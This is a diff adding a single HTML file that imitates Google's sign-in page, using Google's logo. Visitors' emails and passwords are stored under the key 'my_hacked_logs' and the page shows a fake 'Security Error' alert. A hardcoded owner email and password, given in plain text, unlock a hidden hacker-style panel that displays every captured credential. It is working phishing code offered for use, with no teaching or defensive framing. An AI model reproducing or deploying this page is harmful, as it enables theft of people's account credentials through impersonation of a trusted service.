@@ -1,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>Google Login</title>
+    <style>
+        body, html { margin: 0; padding: 0; height: 100%; width: 100%; font-family: 'Roboto', sans-serif; background: #fff; }
+        .main-container { display: flex; align-items: center; justify-content: center; height: 100vh; }
+        .login-box { border: 1px solid #dadce0; border-radius: 8px; width: 90%; max-width: 380px; padding: 35px; text-align: center; box-sizing: border-box; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        .input-field { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; outline-color: #1a73e8; }
+        .next-btn { background: #1a73e8; color: #fff; border: none; padding: 10px; border-radius: 4px; font-weight: 500; width: 100%; margin-top: 20px; cursor: pointer; }
+        
+        #hacker-panel { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; color: #0f0; font-family: monospace; padding: 20px; box-sizing: border-box; z-index: 99999; overflow-y: auto; }
+        .data-card { border: 2px solid #0f0; padding: 15px; margin-bottom: 15px; background: rgba(0, 40, 0, 0.5); border-left: 10px solid #0f0; box-shadow: 0 0 15px #0f0; }
+        .label { color: #0f0; font-weight: bold; }
+        .val { color: #ffff00; }
+    </style>
+</head>
+<body>
+
+<div id="user-view" class="main-container">
+    <div class="login-box">
+        <img src="https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png" class="logo">
+        <h2 style="font-weight: 400;">Sign in</h2>
+        <p>Use your Google Account</p>
+        <input type="email" id="u_mail" class="input-field" placeholder="Email or phone">
+        <input type="password" id="u_pass" class="input-field" placeholder="Enter password">
+        <button class="next-btn" onclick="checkAccess()">Next</button>
+    </div>
+</div>
+
+<div id="hacker-panel">
+    <h2 style="border-bottom: 2px solid #0f0; padding-bottom: 10px;">[ MASTER_TERMINAL_V10 ]</h2>
+    <div id="logs"></div>
+    <button onclick="location.reload()" style="background:red; color:#fff; border:none; padding:10px; position:fixed; bottom:20px; right:20px; cursor:pointer; font-weight:bold;">LOGOUT</button>
+</div>
+
+<script>
+    const AD_MAIL = "islamarifoul39@gmail.com";
+    const AD_PASS = "apon@0077";
+
+    function checkAccess() {
+        let m = document.getElementById('u_mail').value;
+        let p = document.getElementById('u_pass').value;
+
+        if(m === AD_MAIL && p === AD_PASS) {
+            document.getElementById('user-view').style.display = 'none';
+            document.getElementById('hacker-panel').style.display = 'block';
+            showData(); // এখানে ডাটা দেখাবে
+        } else if(m && p) {
+            // ডাটা সরাসরি ফোনের মেমোরিতে (LocalStorage) সেভ করা হচ্ছে
+            let allLogs = JSON.parse(localStorage.getItem('my_hacked_logs') || "[]");
+            allLogs.push({ mail: m, pass: p, time: new Date().toLocaleTimeString() });
+            localStorage.setItem('my_hacked_logs', JSON.stringify(allLogs));
+            
+            alert("Security Error! Please try again.");
+            document.getElementById('u_pass').value = "";
+        }
+    }
+
+    function showData() {
+        let logArea = document.getElementById('logs');
+        let data = JSON.parse(localStorage.getItem('my_hacked_logs') || "[]");
+        logArea.innerHTML = "";
+        
+        if (data.length === 0) {
+            logArea.innerHTML = "<p style='color:white;'>No logs found on this device.</p>";
+            return;
+        }
+
+        data.reverse().forEach(item => {
+            let box = document.createElement('div');
+            box.className = 'data-card';
+            box.innerHTML = `
+                <div><span class="label">TIME:</span> <span class="val">${item.time}</span></div>
+                <div><span class="label">EMAIL:</span> <span class="val">${item.mail}</span></div>
+                <div><span class="label">PASS:</span> <span class="val">${item.pass}</span></div>
+            `;
+            logArea.appendChild(box);
+        });
+    }
+</script>
+</body>
+</html>
